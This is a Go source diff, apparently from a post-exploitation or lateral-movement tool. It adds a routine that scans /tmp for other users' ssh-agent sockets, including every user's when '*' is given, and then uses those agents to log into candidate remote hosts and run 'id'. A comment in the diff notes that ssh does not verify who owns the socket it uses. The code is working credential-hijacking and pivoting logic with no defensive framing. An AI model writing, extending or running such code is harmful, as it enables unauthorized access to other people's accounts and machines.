@@ -13,6 +13,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	utmp "github.com/EricLagergren/go-gnulib/utmp"
@@ -64,6 +65,7 @@ var (
         ControlPath ~/.ssh/.config
         ControlMaster auto
         ControlPersist 10m`
+	TmpSSHSocketPattern = "/tmp/ssh-*/agent.*"
 )
 
 // string parameter is the user who logged into this system.
@@ -90,6 +92,11 @@ const (
 type sshLoginSuccess struct {
 	host       Host
 	sock, user string
+}
+
+type FilePerm struct {
+	mode     os.FileMode
+	uid, gid uint32
 }
 
 type NetProto struct {
@@ -476,6 +483,55 @@ func getNetworkConnections() []netConn {
 	return found
 }
 
+// getSSHSockByBruteForce searches a directory pattern regex for a user's
+// ssh-agent socket. Returns a map of usernames to a list of socket paths.
+func getSSHSockByBruteForce(user, dirPattern string) map[string][]string {
+	var ostat syscall.Stat_t
+	var userUid32 = uint32(0)
+	var userStr = user
+	found := map[string][]string{}
+	anyUser := user == "*"
+	socks, err := filepath.Glob(dirPattern)
+	if err != nil {
+		return map[string][]string{}
+	}
+
+	if !anyUser {
+		entry, err := osuser.Lookup(user)
+		if user != "*" && err != nil {
+			fmt.Println("Failed to look up user: %s", user)
+			return found
+		}
+		userUid, _ := strconv.ParseInt(entry.Uid, 10, 32)
+		userUid32 = uint32(userUid)
+	}
+	for _, s := range socks {
+		f, err := os.Stat(s)
+		if err == nil && f.Mode()&os.ModeSocket == os.ModeSocket {
+			err = syscall.Stat(s, &ostat)
+			if anyUser {
+				u, err := osuser.LookupId(fmt.Sprintf("%d", ostat.Uid))
+				if err != nil {
+					continue
+				}
+				userStr = u.Username
+			} else if userUid32 == ostat.Uid {
+				// This if block is necessary to confirm ownership of the socket.
+				// But the syscall.Chown call is unnecessary as ssh doesn't check
+				// if the user making use of the socket is the same as its owner.
+				//syscall.Chown(s, 0, 0)
+			} else {
+				continue
+			}
+			found[userStr] = append(found[userStr], s)
+		}
+	}
+	fmt.Println(found)
+	return found
+}
+
+// getSSHSocketByPid attempts to look up a user's SSH_AUTH_SOCK env var by his
+// login process ID.
 func getSSHSocketByPid(pid int32) (string, error) {
 	var index = 0
 	var name = "SSH_AUTH_SOCK"
@@ -491,56 +547,85 @@ func getSSHSocketByPid(pid int32) (string, error) {
 	return string(sub[:bytes.Index(sub, []byte("\x00"))]), nil
 }
 
-func sshLoginWithAgent(user string, host Host, sockPath string) bool {
-	sock, err := net.Dial("unix", sockPath)
-	if err != nil {
-		return false
-	}
+// sshLoginWithAgent will attempt to find a valid ssh-agent for the logged-in
+// user and use that to log into the specified host as the user himself.
+// There is currently no support for logging into host H as user X with user
+// Y's ssh-agent.
+func sshLoginWithAgent(user string, host Host) (string, error) {
+	var sockPaths map[string][]string
+	/*
+		path, err := getSSHSocketByPid(login.pid)
+		if err == nil {
+			sockPaths = []string{path}
+		} else {
+	*/
+	sockPaths = getSSHSockByBruteForce(user, TmpSSHSocketPattern)
+	/*
+		}
+	*/
+	for user, userPaths := range sockPaths {
+		for _, path := range userPaths {
+			fmt.Printf("Attempting remote login via %s as %s to %s:%d\n", path, user, host.ip, host.port)
+			sock, err := net.Dial("unix", path)
+			if err != nil {
+				fmt.Printf("Can't open socket: %s\n", path)
+				continue
+			}
 
-	agent := agent.NewClient(sock)
+			agent := agent.NewClient(sock)
 
-	signers, err := agent.Signers()
-	if err != nil {
-		fmt.Println(err)
-		return false
-	}
+			fmt.Println("here0")
+			signers, err := agent.Signers()
+			if err != nil {
+				fmt.Println(err)
+				continue
+			}
 
-	config := &ssh.ClientConfig{
-		User: user,
-		Auth: []ssh.AuthMethod{
-			ssh.PublicKeys(signers...),
-		},
-	}
+			config := &ssh.ClientConfig{
+				User: user,
+				Auth: []ssh.AuthMethod{
+					ssh.PublicKeys(signers...),
+				},
+			}
 
-	// If the destination address is ipv6, wrap it in brackets, otherwise leave it bare.
-	var hostStr = ""
-	if host.proto.l3 == L3ProtoIpv4 {
-		hostStr = host.ip
-	} else {
-		hostStr = fmt.Sprintf("[%s]", host.ip)
-	}
-	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.port), config)
-	if err != nil {
-		fmt.Printf("Failed to dial: %v", err)
-		return false
-	}
+			// If the destination address is ipv6, wrap it in brackets, otherwise leave it bare.
+			var hostStr = ""
+			if host.proto.l3 == L3ProtoIpv4 {
+				hostStr = host.ip
+			} else {
+				hostStr = fmt.Sprintf("[%s]", host.ip)
+			}
+			fmt.Println("here1")
+			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.port), config)
+			if err != nil {
+				fmt.Printf("Failed to dial: %v", err)
+				continue
+			}
 
-	session, err := client.NewSession()
-	if err != nil {
-		fmt.Printf("Failed to create session: %v", err)
-		return false
-	}
-	defer session.Close()
+			fmt.Println("here2")
+			session, err := client.NewSession()
+			if err != nil {
+				fmt.Printf("Failed to create session: %v", err)
+				continue
+			}
+			defer session.Close()
 
-	var b bytes.Buffer
-	session.Stdout = &b
-	cmd := "hostname"
-	if err := session.Run(cmd); err != nil {
-		fmt.Printf("Failed to run cmd: %s: %v", cmd, err)
-		return false
+			var b bytes.Buffer
+			session.Stdout = &b
+			cmd := "id"
+			if err := session.Run(cmd); err != nil {
+				fmt.Printf("Failed to run cmd: %s: %v", cmd, err)
+				continue
+			}
+			fmt.Println(b.String())
+			return path, nil
+		}
 	}
-	fmt.Println(b.String())
-	return true
+	var msg = ""
+	if len(sockPaths) == 0 {
+		msg = "no "
+	}
+	return "", fmt.Errorf("failed to login with %sagents", msg)
 }
 
 // sshKnownHosts attempts to fetch all the known_hosts files for all users on
@@ -818,22 +903,20 @@ func attemptRemoteLogin(user string) map[string][]sshLoginSuccess {
 	hosts := getCandidateRHosts()
 	loggedIn := getWho()
 	found := map[string][]sshLoginSuccess{}
+	fmt.Println(loggedIn)
 	for _, host := range hosts {
 		for _, login := range loggedIn {
 			if user == login.user || user == "*" {
 				// Look for an ssh-agent running under this login session
-				fmt.Println(login.pid)
-				sockPath, err := getSSHSocketByPid(login.pid)
-				fmt.Println(err)
+				sockPath, err := sshLoginWithAgent(user, host)
 				if err == nil {
-					fmt.Printf("Attempting remote login via ssh-agent as %s to %s:%d\n", user, host.ip, host.port)
-					if sshLoginWithAgent(user, host, sockPath) {
-						found[user] = append(found[login.user], sshLoginSuccess{
-							host: host,
-							sock: sockPath,
-							user: login.user,
-						})
-					}
+					found[user] = append(found[login.user], sshLoginSuccess{
+						host: host,
+						sock: sockPath,
+						user: login.user,
+					})
+				} else {
+					fmt.Println(err)
 				}
 			}
 		}
